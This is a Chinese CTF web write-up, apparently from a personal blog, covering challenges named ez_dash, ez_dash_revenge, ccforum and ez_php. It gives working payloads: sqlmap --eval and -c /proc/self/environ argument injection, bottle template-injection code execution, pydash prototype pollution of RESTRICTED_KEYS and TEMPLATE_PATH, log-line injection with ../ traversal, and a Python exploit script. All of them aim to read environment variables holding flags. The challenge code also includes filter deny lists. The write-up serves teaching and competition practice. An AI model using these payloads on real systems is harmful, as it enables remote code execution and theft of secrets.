--flush-session\u0026#39; # 直接拼接参数可能导致命令注入漏洞 def generate(): # 定义生成器函数用于流式输出 # 启动子进程执行命令 process = subprocess.Popen( command.split(), # 将命令按空格分割成列表（简单方式，复杂参数可能出错） stdout=subprocess.PIPE, # 捕获标准输出 stderr=subprocess.STDOUT, # 将错误输出合并到标准输出 shell=False # 禁用shell模式（安全最佳实践） ) while True: # 持续读取输出 output = process.stdout.readline() # 逐行读取输出 if output == \u0026#39;\u0026#39; and process.poll() is not None: # 判断进程是否结束 break if output: # 如果有输出内容 yield output # 生成输出内容 # 返回流式响应（实时显示扫描结果） return StreamingResponse(generate(), media_type=\u0026#34;text/plain\u0026#34;) 这里shell=flase,意味内容不会经过 Shell 的语法解析，全被当作参数看待，那就直接找找sqlmap有哪些可以执行命令或者读文件的参数\nsqlmap | GTFOBins\n通过 \u0026ndash;eval 参数可以执⾏ Python 代码, 注意因为上⾯ command.split() 默认是按空格分隔的（所以下面的=号可变空格），注意这⾥参数的值不需要加上单双引号, 因为上⾯已经设置了 shell=False , 如果加上去反⽽代表的是 \u0026ldquo;eval ⼀个 Python 字符串\u0026rdquo;，然后将payload改为紧凑型，避免使用分号。\n最终payload\n最后打127.0.0.1 --eval=__import__('os').system('env')//等号可以变空格\n用法 | sqlmap 用户手册\n翻了翻sqlmap手册，发现-c可以加载配置文件选项、\n所以也可以打\nhttps://localhost?id=1 -c /proc/self/environ //id=1没实际作用，测试时候写的，可以不加\nez_dash 审计代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 # 提示信息：Flag在环境变量中，这可能意味着代码中存在某种漏洞，可以通过漏洞获取环境变量中的Flag值。 from typing import Optional # 导入Optional类型，用于类型注解 import pydash # 导入pydash模块，用于操作对象属性 import bottle # 导入bottle框架，用于创建Web服务器 # 定义一个包含禁止访问的属性路径的列表，这些路径通常是Python对象的内部属性，防止用户通过这些路径篡改对象内部结构。 __forbidden_path__=[\u0026#39;__annotations__\u0026#39;, \u0026#39;__call__\u0026#39;, \u0026#39;__class__\u0026#39;, \u0026#39;__closure__\u0026#39;, \u0026#39;__code__\u0026#39;, \u0026#39;__defaults__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__dict__\u0026#39;, \u0026#39;__dir__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__eq__\u0026#39;, \u0026#39;__format__\u0026#39;, \u0026#39;__ge__\u0026#39;, \u0026#39;__get__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, \u0026#39;__gt__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__init_subclass__\u0026#39;, \u0026#39;__kwdefaults__\u0026#39;, \u0026#39;__le__\u0026#39;, \u0026#39;__lt__\u0026#39;, \u0026#39;__module__\u0026#39;, \u0026#39;__name__\u0026#39;, \u0026#39;__ne__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__qualname__\u0026#39;, \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__setattr__\u0026#39;, \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;__wrapped__\u0026#39;, \u0026#34;Optional\u0026#34;, \u0026#34;func\u0026#34;, \u0026#34;render\u0026#34;] # 定义一个包含禁止访问的名称的列表，初始时包含\u0026#34;bottle\u0026#34;，防止用户直接操作bottle模块。 __forbidden_name__=[\u0026#34;bottle\u0026#34;] # 将内置模块中的所有属性名称添加到禁止访问的名称列表中，防止用户通过内置模块进行危险操作。 __forbidden_name__.extend(dir(globals()[\u0026#34;__builtins__\u0026#34;])) # 定义一个函数setval，用于设置指定对象的属性值。 def setval(name:str, path:str, value:str) -\u0026gt; Optional[bool]: # 如果名称中包含双下划线（__），直接返回False，防止用户访问Python的特殊方法或属性。 if name.find(\u0026#34;__\u0026#34;)\u0026gt;=0: return False # 遍历禁止访问的名称列表，如果名称在列表中，返回False。 for word in __forbidden_name__: if name==word: return False # 遍历禁止访问的路径列表，如果路径中包含列表中的内容，返回False。 for word in __forbidden_path__: if path.find(word)\u0026gt;=0: return False # 从全局变量中获取指定名称的对象。 obj=globals()[name] try: # 使用pydash模块的set_方法设置对象的属性值。 pydash.set_(obj, path, value) except: # 如果设置失败，返回False。 return False # 如果设置成功，返回True。 return True # 定义一个bottle的POST路由/setValue，用于接收用户请求并调用setval函数设置属性值。 @bottle.post(\u0026#39;/setValue\u0026#39;) def set_value(): # 从请求的查询参数中获取对象名称。 name = bottle.request.query.get(\u0026#39;name\u0026#39;) # 从请求的JSON数据中获取属性路径。 path = bottle.request.json.get(\u0026#39;path\u0026#39;) # 如果路径不是字符串，返回\u0026#34;no\u0026#34;。 if not isinstance(path, str): return \u0026#34;no\u0026#34; # 如果名称或路径长度超过限制，返回\u0026#34;no\u0026#34;。 if len(name) \u0026gt; 6 or len(path) \u0026gt; 32: return \u0026#34;no\u0026#34; # 从请求的JSON数据中获取属性值。 value = bottle.request.json.get(\u0026#39;value\u0026#39;) # 调用setval函数设置属性值，根据返回值返回\u0026#34;yes\u0026#34;或\u0026#34;no\u0026#34;。 return \u0026#34;yes\u0026#34; if setval(name, path, value) else \u0026#34;no\u0026#34; # 定义一个bottle的GET路由/render，用于渲染模板。 @bottle.get(\u0026#39;/render\u0026#39;) def render_template(): # 从请求的查询参数中获取模板路径。 path = bottle.request.query.get(\u0026#39;path\u0026#39;) # 如果路径中包含\u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, \u0026#34;.\u0026#34;等字符，返回\u0026#34;Hacker\u0026#34;，防止用户通过模板注入攻击。 if path.find(\u0026#34;{\u0026#34;) \u0026gt;= 0 or path.find(\u0026#34;}\u0026#34;) \u0026gt;= 0 or path.find(\u0026#34;.\u0026#34;) \u0026gt;= 0: return \u0026#34;Hacker\u0026#34; # 使用bottle的template方法渲染模板并返回结果。 return bottle.template(path) # 启动bottle服务器，监听0.0.0.0的8000端口。 bottle.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8000) 解法一 这里没过滤%，所以在rende路由可以执行python代码（类似打ssti）,paylaod\n原型是%eval(\u0026quot;__import__('os').popen('env')\u0026quot;)但是过滤了点号，所以用chr(46)代替，然后也不能出现空格，然后render只能渲染文件，不能渲染字符串，所以要将env输入到一个文件中，所以最终pyload是\n%eval(\u0026quot;__import__('os')\u0026quot;%2bchr(46)%2b\u0026quot;popen('env\u0026gt;1')\u0026quot;)\n解法二：打abort无回显 1 \u0026lt;%%20from%20bottle%20import%20abort%0afrom%20subprocess%20import%20getoutput%0aa=getoutput(\u0026#34;env\u0026#34;)%0aabort(404,a)%20%\u0026gt; 写成代码形式可能看得懂一点\n1 2 3 4 5 6 7 8 9 10 11 # 从bottle库中导入abort函数，用于发送HTTP错误响应 from bottle import abort # 从subprocess库中导入getoutput函数，用于执行系统命令并获取输出 from subprocess import getoutput # 执行系统命令\u0026#34;env\u0026#34;，该命令用于列出当前环境变量，并将输出存储在变量a中 a = getoutput(\u0026#34;env\u0026#34;) # 使用abort函数发送一个404 HTTP错误响应，并将环境变量的输出作为错误消息返回 abort(404, a) ez_dash_revenge 此题过滤了%，所以无法打上面得非预期（其实上面也是考原型污染链）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 from typing import Optional import pydash import bottle # 禁止访问的路径属性列表，主要是Python对象的特殊方法和属性 __forbidden_path__ = [\u0026#39;__annotations__\u0026#39;, \u0026#39;__call__\u0026#39;, \u0026#39;__class__\u0026#39;, \u0026#39;__closure__\u0026#39;, \u0026#39;__code__\u0026#39;, \u0026#39;__defaults__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__dict__\u0026#39;, \u0026#39;__dir__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__eq__\u0026#39;, \u0026#39;__format__\u0026#39;, \u0026#39;__ge__\u0026#39;, \u0026#39;__get__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, \u0026#39;__gt__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__init_subclass__\u0026#39;, \u0026#39;__kwdefaults__\u0026#39;, \u0026#39;__le__\u0026#39;, \u0026#39;__lt__\u0026#39;, \u0026#39;__module__\u0026#39;, \u0026#39;__name__\u0026#39;, \u0026#39;__ne__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__qualname__\u0026#39;, \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__setattr__\u0026#39;, \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;__wrapped__\u0026#39;, \u0026#34;Optional\u0026#34;, \u0026#34;render\u0026#34; ] # 禁止访问的名称列表，包括bottle模块和内置对象 __forbidden_name__ = [\u0026#34;bottle\u0026#34;] __forbidden_name__.extend(dir(globals()[\u0026#34;__builtins__\u0026#34;])) # 设置变量值的函数 def setval(name: str, path: str, value: str) -\u0026gt; Optional[bool]: # 如果名称包含双下划线，返回False if name.find(\u0026#34;__\u0026#34;) \u0026gt;= 0: return False # 检查名称是否在禁止列表中 for word in __forbidden_name__: if name == word: return False # 检查路径是否包含禁止的属性 for word in __forbidden_path__: if path.find(word) \u0026gt;= 0: return False # 获取全局对象 obj = globals()[name] try: # 使用pydash.set_方法设置对象的属性值 pydash.set_(obj, path, value) except: # 如果设置失败，返回False return False # 设置成功，返回True return True # 处理POST请求的路由，用于设置变量值 @bottle.post(\u0026#39;/setValue\u0026#39;) def set_value(): # 获取请求中的name参数 name = bottle.request.query.get(\u0026#39;name\u0026#39;) # 获取请求中的path参数，必须是字符串类型 path = bottle.request.json.get(\u0026#39;path\u0026#39;) if not isinstance(path, str): return \u0026#34;no\u0026#34; # 检查name和path的长度是否超出限制 if len(name) \u0026gt; 6 or len(path) \u0026gt; 32: return \u0026#34;no\u0026#34; # 获取请求中的value参数 value = bottle.request.json.get(\u0026#39;value\u0026#39;) # 调用setval函数设置变量值，并根据结果返回yes或no return \u0026#34;yes\u0026#34; if setval(name, path, value) else \u0026#34;no\u0026#34; # 处理GET请求的路由，用于渲染模板 @bottle.get(\u0026#39;/render\u0026#39;) def render_template(): # 获取请求中的path参数 path = bottle.request.query.get(\u0026#39;path\u0026#39;) # 检查path长度是否超出限制 if len(path) \u0026gt; 10: return \u0026#34;hacker\u0026#34; # 定义黑名单字符，防止路径注入 blacklist = [\u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, \u0026#34;.\u0026#34;, \u0026#34;%\u0026#34;, \u0026#34;\u0026lt;\u0026#34;, \u0026#34;\u0026gt;\u0026#34;, \u0026#34;_\u0026#34;] # 检查path是否包含黑名单字符 for c in path: if c in blacklist: return \u0026#34;hacker\u0026#34; # 使用bottle.template渲染模板 return bottle.template(path) # 启动bottle应用，监听所有接口的8000端口 bottle.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8000) 此题先看懂setval函数，这里面 pydash.set_(obj, path, value)很重要，其中name是我们要污染的对象，path是被污染的功能点路径，value是我们想让这个对象成为的值。\n再来看此题，由pydash知https://github.com/dgilland/pydash/blob/develop/src/pydash/helpers.py，path有一个bottle.TEMPLATE_PATH\u0026mdash;(指定模板文件所在的路径)，我们要污染他的路径，让他指向/proc/self/,然后再最后在 /render 路由下 GET 传参 path 为 environ ，对其进⾏渲染，就可以获取环境变量了，但是pydash限制不能随意更改bottle属性，接下来审计一下pydash源码，关键限制代码如下（截取了三段代码）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 def base_set(obj, key, value, allow_override=True): \u0026#34;\u0026#34;\u0026#34; Set an object\u0026#39;s `key` to `value`. If `obj` is a ``list`` and the `key` is the next available index position, append to list; otherwise, pad the list of ``None`` and then append to the list. Args: obj: Object to assign value to. key: Key or index to assign to. value: Value to assign. allow_override: Whether to allow overriding a previously set key. \u0026#34;\u0026#34;\u0026#34; # 如果obj是字典类型 if isinstance(obj, dict): # 如果允许覆盖或者key不在字典中 if allow_override or key not in obj: # 将key对应的值设置为value obj[key] = value # 如果obj是列表类型 elif isinstance(obj, list): # 将key转换为整数类型 key = int(key) # 如果key小于列表的长度 if key \u0026lt; len(obj): # 如果允许覆盖 if allow_override: # 将列表中key位置的值设置为value obj[key] = value else: # 如果key大于列表的长度 if key \u0026gt; len(obj): # 使用None填充列表，直到key的位置 obj[:] = (obj + [None] * key)[:key] # 在列表末尾追加value obj.append(value) # 如果obj是其他类型，并且允许覆盖或者该属性不存在，并且obj不是None elif (allow_override or not hasattr(obj, key)) and obj is not None: # 调用_raise_if_restricted_key函数检查是否是受限制的键 _raise_if_restricted_key(key) # 使用setattr函数设置obj的key属性为value setattr(obj, key, value) 1 RESTRICTED_KEYS = (\u0026#34;__globals__\u0026#34;, \u0026#34;__builtins__\u0026#34;) 1 2 3 4 def _raise_if_restricted_key(key): # Prevent access to restricted keys for security reasons. if key in RESTRICTED_KEYS: raise KeyError(f\u0026#34;access to restricted key {key!r} is not allowed\u0026#34;) 所以接下来思路明显了，先污染key函数为空，使我们可以用globals，然后再污染PATH，再渲染envrion即可\n用bp在/setValue抓包\n1 2 3 name=pydash#污染对象是pydash path:\u0026#34;helpers.RESTRICTED_KEYS\u0026#34; # 路径就是 helpers ⽂件中的 RESTRICTED_KEYS value:[]#修改成为的值就是空列表 1 2 3 name=setval # 污染对象是 setval path:\u0026#34;__globals__.bottle.TEMPLATE_PATH\u0026#34; # 路径是模板⽂件路径 value:[../../../../proc/self] # 修改为的值是存储环境变量⽂件路径，因为题⽬提示flag在环境变量中name=setval 深度解析：此paylaod寻找setval函数，将该函数往上查询____globals____.（__globals__ 是函数对象的一个属性，它会返回一个包含该函数全局命名空间的字典）,然后调用bottle框架中的TEMPLATE_PATH(指定模板文件所在的路径)，将路径设置为/proc/self/这样访问path时会自动跳转到这个路径下\n流程：\n1 2 3 4 5 { \u0026#34;path\u0026#34;:\u0026#34;helpers.RESTRICTED_KEYS\u0026#34;, \u0026#34;value\u0026#34;:[ ] } 注意type改成json\n1 2 3 4 { \u0026#34;path\u0026#34;:\u0026#34;__globals__.bottle.TEMPLATE_PATH\u0026#34;, \u0026#34;value\u0026#34;:[\u0026#34;/proc/self\u0026#34;] } ","date":"2025-03-26T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/2025-nctf-web/","title":"2025-nctf-web"},{"content":" ccforum Seay审计一下代码\nadmin.php与config.php存在file_get_content函数，即存在文件读取漏洞，那么先审计admin.php\nadmin.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 \u0026lt;?php // 引入配置文件，通常包含数据库连接信息等 require \u0026#39;config.php\u0026#39;; // 检查请求方法是否为POST，如果是，则处理登录逻辑 if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39;) { // 获取POST请求中的用户名和密码，默认值为空字符串 $username = $_POST[\u0026#39;username\u0026#39;] ?? \u0026#39;\u0026#39;; $password = $_POST[\u0026#39;password\u0026#39;] ?? \u0026#39;\u0026#39;; try { // 准备SQL语句，查询admins表中用户名匹配的记录 $stmt = $pdo-\u0026gt;prepare(\u0026#34;SELECT * FROM admins WHERE username = ?\u0026#34;); // 执行查询，传入用户名作为参数 $stmt-\u0026gt;execute([$username]); // 获取查询结果 $admin = $stmt-\u0026gt;fetch(); // 如果查询到管理员且密码验证通过 if ($admin \u0026amp;\u0026amp; password_verify($password, $admin[\u0026#39;password\u0026#39;])) { // 设置会话变量，标识管理员登录状态 $_SESSION[\u0026#39;admin_id\u0026#39;] = $admin[\u0026#39;id\u0026#39;]; $_SESSION[\u0026#39;admin_username\u0026#39;] = $admin[\u0026#39;username\u0026#39;]; $_SESSION[\u0026#39;admin\u0026#39;] = true; // 记录登录成功的操作日志 log_action($username, \u0026#39;admin_login\u0026#39;, 1); // 重定向到管理员页面 header(\u0026#34;Location: admin.php\u0026#34;); // 终止脚本执行 exit(); } else { // 记录登录失败的操作日志 log_action($username, \u0026#39;admin_login\u0026#39;, 0, \u0026#39;Invalid credentials\u0026#39;); // 输出错误信息并终止脚本 die(\u0026#34;Invalid credentials\u0026#34;); } } catch (PDOException $e) { // 捕获数据库操作异常，记录错误日志 log_action($username, \u0026#39;admin_login\u0026#39;, 0, $e-\u0026gt;getMessage()); // 输出错误信息并终止脚本 die(\u0026#34;Admin login failed: \u0026#34; . $e-\u0026gt;getMessage()); } } // 检查会话中是否没有管理员登录状态，如果是，则拒绝访问 if (!isset($_SESSION[\u0026#39;admin\u0026#39;]) || !$_SESSION[\u0026#39;admin\u0026#39;]) { die(\u0026#34;Access denied. Please login as admin.\u0026#34;); } // 定义操作日志文件路径 $action_log_path = \u0026#39;/var/www/action.log\u0026#39;; // 检查操作日志文件是否存在，如果不存在，则输出错误信息并终止脚本 if (!file_exists($action_log_path)) { die(\u0026#34;Action log file not found.\u0026#34;); } // 读取操作日志文件内容 $action_log = file_get_contents($action_log_path); // 将日志内容按行分割成数组 $log_lines = explode(\u0026#34;\\n\u0026#34;, $action_log); // 初始化被封禁用户和失败日志数组 $banned_users = []; $failed_logs = []; // 遍历每一行日志 foreach ($log_lines as $line) { // 如果行为空，跳过 if (empty($line)) { continue; } // 按逗号分割日志行 $parts = explode(\u0026#39;,\u0026#39;, $line); // 如果分割后的部分数量不足5个，跳过 if (count($parts) \u0026lt; 5) { continue; } // 获取编码后的用户名、操作类型、成功状态和附加信息 $encoded_user = $parts[1]; $action = $parts[2]; $success = (int) $parts[3]; $additional_info = $parts[4]; //总结上面的代码就是获取/var/www/action.log给action_log，再用，分割成part // 如果操作类型是记录封禁 if ($action === \u0026#39;record_banned\u0026#39;) { // 如果操作成功 if ($success === 1) { // 将附加信息添加到被封禁用户数组中 $banned_users[$encoded_user][] = $additional_info; } else { // 将附加信息添加到失败日志数组中 $failed_logs[] = $additional_info; } } } //这里要求action==record_banned,success=1,然后进行下面的遍历文件目录的内容全部传给参数， 所以如果构造{$encoded_user}为../../../,就相当与回到根目录，从而可能读到flag // 初始化被封禁内容数组 $banned_contents = []; // 遍历被封禁用户数组 foreach ($banned_users as $encoded_user =\u0026gt; $logs) { // 构造被封禁用户目录路径 $banned_dir = \u0026#34;/var/www/banned/{$encoded_user}\u0026#34;;//构造{$encoded_user}为../../../，之后直接读根目录 // 如果目录存在 if (file_exists($banned_dir)) { // 获取目录中的文件列表 $files = scandir($banned_dir); // 遍历文件列表 foreach ($files as $file) { // 跳过目录本身和父目录 if ($file !== \u0026#39;.\u0026#39; \u0026amp;\u0026amp; $file !== \u0026#39;..\u0026#39;) { // 构造文件路径 $file_path = $banned_dir . \u0026#39;/\u0026#39; . $file; // 读取文件内容 $content = file_get_contents($file_path); // 将内容添加到被封禁内容数组中 $banned_contents[$username][] = $content; } } } } ?\u0026gt; 接下来要知道action.log的内容，所以先看看config.php文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 // 启动会话 session_start(); // 定义数据库连接参数 define(\u0026#39;DB_HOST\u0026#39;, \u0026#39;127.0.0.1\u0026#39;); define(\u0026#39;DB_PORT\u0026#39;, \u0026#39;3306\u0026#39;); define(\u0026#39;DB_NAME\u0026#39;, \u0026#39;forum\u0026#39;); define(\u0026#39;DB_USER\u0026#39;, \u0026#39;mgr\u0026#39;); define(\u0026#39;DB_PASS\u0026#39;, \u0026#39;j92wn0UXFYsUAFiN\u0026#39;); try { // 创建PDO实例，连接到MySQL数据库 $pdo = new PDO( \u0026#34;mysql:host=\u0026#34; . DB_HOST . \u0026#34;;port=\u0026#34; . DB_PORT . \u0026#34;;dbname=\u0026#34; . DB_NAME, DB_USER, DB_PASS, [PDO::ATTR_ERRMODE =\u0026gt; PDO::ERRMODE_EXCEPTION] // 设置错误模式为异常 ); } catch (PDOException $e) { // 如果连接失败，输出错误信息并终止脚本 die(\u0026#34;Database connection failed: \u0026#34; . $e-\u0026gt;getMessage()); } // 定义一个函数，用于对用户名进行Base64编码 function encode_uname($username) { return base64_encode($username); } // 定义一个函数，用于记录操作日志 function log_action($username, $action, $succ, $additional = \u0026#39;\u0026#39;) { // 生成唯一的日志ID $log_id = uniqid(); // 对用户名进行编码 $e_username = encode_uname($username); // 格式化日志行 $log_line = sprintf( \u0026#34;%s,%s,%s,%d,%s\\n\u0026#34;, $log_id, $e_username, $action, $succ, $additional ); // 将日志行追加到操作日志文件中 file_put_contents(\u0026#39;/var/www/action.log\u0026#39;, $log_line, FILE_APPEND); } // 定义一个函数，用于记录封禁操作 function record_banned($username, $banned) { // 对用户名进行编码 $e_username = encode_uname($username); // 构造被封禁用户目录路径 $banned_dir = \u0026#34;/var/www/banned/{$e_username}\u0026#34;; // 假设目录创建成功 $created = true; // 如果目录不存在，则尝试创建 if (!file_exists($banned_dir)) { $created = mkdir($banned_dir, 0750); // 设置目录权限为0750 } // 初始化日志信息和成功状态 $log = \u0026#34;\u0026#34;; $succ = 1; // 如果目录创建失败 if (!$created) { $succ = 0; // 设置成功状态为失败 $log = \u0026#34;Failed to create record directory for \u0026#34; . $username; // 记录错误信息 } else { // 构造文件名，使用当前时间戳 $filename = $banned_dir . \u0026#39;/\u0026#39; . time() . \u0026#39;.txt\u0026#39;; // 尝试将封禁内容写入文件 if (!file_put_contents($filename, $banned)) { $succ = 0; // 如果写入失败，设置成功状态为失败 $log = \u0026#34;Failed to record banned content\u0026#34;; // 记录错误信息 } } // 调用log_action函数记录封禁操作的日志 log_action($username, \u0026#39;record_banned\u0026#39;, $succ, $log); } // 定义一个函数，用于检查内容是否包含敏感词 function has_sensitive_words($content) { // 定义敏感词列表 $SENSITIVE_WORDS = [\u0026#39;敏感词\u0026#39;, \u0026#39;SENSITIVE WORDS\u0026#39;,]; // 遍历敏感词列表 foreach ($SENSITIVE_WORDS as $word) { // 使用stripos函数（不区分大小写）检查内容中是否包含敏感词 if (stripos($content, $word) !== false) { // 如果找到敏感词，返回true return true; } } // 如果没有找到敏感词，返回false return false; } 首先看log_action函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function log_action($username, $action, $succ, $additional = \u0026#39;\u0026#39;) { // 生成唯一的日志ID $log_id = uniqid(); // 对用户名进行编码 $e_username = encode_uname($username); // 格式化日志行 $log_line = sprintf( \u0026#34;%s,%s,%s,%d,%s\\n\u0026#34;, $log_id, $e_username, $action, $succ, $additional ); // 将日志行追加到操作日志文件中 file_put_contents(\u0026#39;/var/www/action.log\u0026#39;, $log_line, FILE_APPEND); } 看这个代码知道，log_id是唯一生成的，不可控制，e_username被加密，不好控制进行目录穿越，action要=record_banned,success=1，所以只能控制additional(它刚好为空)\n接下来寻找调用action_log的地方，也就是record_banned函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 function record_banned($username, $banned) { // 对用户名进行编码 $e_username = encode_uname($username); // 构造被封禁用户目录路径 $banned_dir = \u0026#34;/var/www/banned/{$e_username}\u0026#34;; // 假设目录创建成功 $created = true; // 如果目录不存在，则尝试创建 if (!file_exists($banned_dir)) { $created = mkdir($banned_dir, 0750); // 设置目录权限为0750 } // 初始化日志信息和成功状态 $log = \u0026#34;\u0026#34;; $succ = 1; // 如果目录创建失败 if (!$created) { $succ = 0; // 设置成功状态为失败 $log = \u0026#34;Failed to create record directory for \u0026#34; . $username; // 记录错误信息 } else { // 构造文件名，使用当前时间戳 $filename = $banned_dir . \u0026#39;/\u0026#39; . time() . \u0026#39;.txt\u0026#39;; // 尝试将封禁内容写入文件 if (!file_put_contents($filename, $banned)) { $succ = 0; // 如果写入失败，设置成功状态为失败 $log = \u0026#34;Failed to record banned content\u0026#34;; // 记录错误信息 } } // 调用log_action函数记录封禁操作的日志 log_action($username, \u0026#39;record_banned\u0026#39;, $succ, $log); } 这里若是想传入/var/www/action.log后想要变量根目录所有文件，必须有某一行满足?(path[0]是id不用管)，../../../,record_banned,1,(path[4]无要求)，第一行是绝对不可能，因为username被base64加密，所以第一行就构造不了../../../（因为没有什么加密后是../../../）,所以就在第二行构造?,../../../,record_banned,1,?。那么就要在log下手了\n这里$log有3种情况，空或Failed to create record directory for \u0026quot; . $username;或\u0026quot;Failed to record banned content\u0026quot;；显然我们要通过构造username这个变量达到目的。所以log=\u0026ldquo;Failed to create record directory for \u0026quot; . $username;要到达这个目的，就要使创建目录失败，mkdir方法不可以创建多级目录，即其中不能包含/字符，也就是说username编码后包含/,恰好???编码后有/\n第二行怎么出来？显然要%0a,那还要满足第二行包括?,../../../,record_banned,? 那很显然了，username=???%0a,../../../,record_banned,1,\n所以写入/var/www/action.log的内容是\nid,encode_base64(???%0a,../../../,record_banned,1,),record_banned,1,Failed to create record directory for ???%0a,../../../,record_banned,1, 经过分行后第一行是\nid,encode_base64(???%0a,../../../,record_banned,1,),record_banned,1,Failed to create record directory for ???\n第二行是,../../../,record_banned,1, 符合要求！\n接下来找调用record_banned的函数，在post.php里\nhas_sensitive_words在config.php里\n显然要符合has_sensitive_words($title) || has_sensitive_words($content)，即让title或content存在敏感词或者 SENSITIVE WORDS\n所以解题思路、\n1.先注册用户username=???\\n,../../../,record_banned,1, password=111111111(任意内容，满足长度就好,手动注册的话\\n要写成%0a)\n2.访问post路由，post传参title或者content\n3.登入管理员账户，进入admin.php,拿到flag（爆破）\n直接打脚本也行，然后直接访问admin.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from requests import Session basic = \u0026#34;http://ip:9090/\u0026#34; data = {\u0026#34;username\u0026#34;: \u0026#34;???\\n,../../../,record_banned,1,\u0026#34;,\u0026#34;password\u0026#34;: \u0026#34;111111111111\u0026#34;,} def register(sess: Session): resp = sess.post(basic + \u0026#34;/register.php\u0026#34;, data=data) def login(sess: Session): resp = sess.post(basic + \u0026#34;/login.php\u0026#34;, data=data) def post(sess: Session): data1 = { \u0026#34;title\u0026#34;: \u0026#34;敏感词\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;tset\u0026#34;, } resp = sess.post(basic + \u0026#34;/post.php\u0026#34;, data=data1) if __name__ == \u0026#34;__main__\u0026#34;: sess = Session() register(sess) login(sess) post(sess) ","date":"2025-03-26T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/2025-%E9%95%BF%E5%9F%8E%E6%9D%AF-ccforum/","title":"2025-长城杯-ccforum"},{"content":"ez_php 这题前面简单，不多说\n1 2 post传：a[]=1\u0026amp;b[]=2 get传:?password=123456a 解法一日志包含 接下来我打的是日志包含，算是非预期\n各发包2次哈\n解法二打自增 文件包含读取后，有base64字符（还一个非预期直接/file就能出flag）\n1 file=php://filter/read=convert.base64-encode/resource=level2.php 解码得到\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php error_reporting(0); if (isset($_POST[\u0026#39;rce\u0026#39;])) { $rce = $_POST[\u0026#39;rce\u0026#39;]; if (strlen($rce) \u0026lt;= 120) { if (is_string($rce)) { if (!preg_match(\u0026#34;/[!@#%^\u0026amp;*:\u0026#39;\\-\u0026lt;?\u0026gt;\\\u0026#34;\\/|`a-zA-Z~\\\\\\\\]/\u0026#34;, $rce)) { eval($rce); } else { echo(\u0026#34;Are you hack me?\u0026#34;); } } else { echo \u0026#34;I want string!\u0026#34;; } } else { echo \u0026#34;too long!\u0026#34;; } } ?\u0026gt; 这里无字母rce，且过滤了^,~,|,那只能打自增（其实也可以fuzz一下看看可以用哪些）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php // 定义正则表达式 $pattern = \u0026#34;/[a-zA-Z0-9@#%^\u0026amp;*:{}\\-\u0026lt;\\?\u0026gt;\\\u0026#34;|`~\\\\\\\\]/\u0026#34;; // 存储未被过滤的字符 $unfilteredChars = []; // 遍历 ASCII 码从 32 到 127 for ($i = 32; $i \u0026lt;= 127; $i++) { $char = chr($i); // 获取对应的字符 if (!preg_match($pattern, $char)) { // 检查是否未被过滤 $unfilteredChars[] = $char; // 添加到未过滤字符数组 } } // 输出未被过滤的字符 echo \u0026#34;未被过滤的字符: \u0026#34; . implode(\u0026#39;\u0026#39;, $unfilteredChars) . \u0026#34;\\n\u0026#34;; ?\u0026gt; 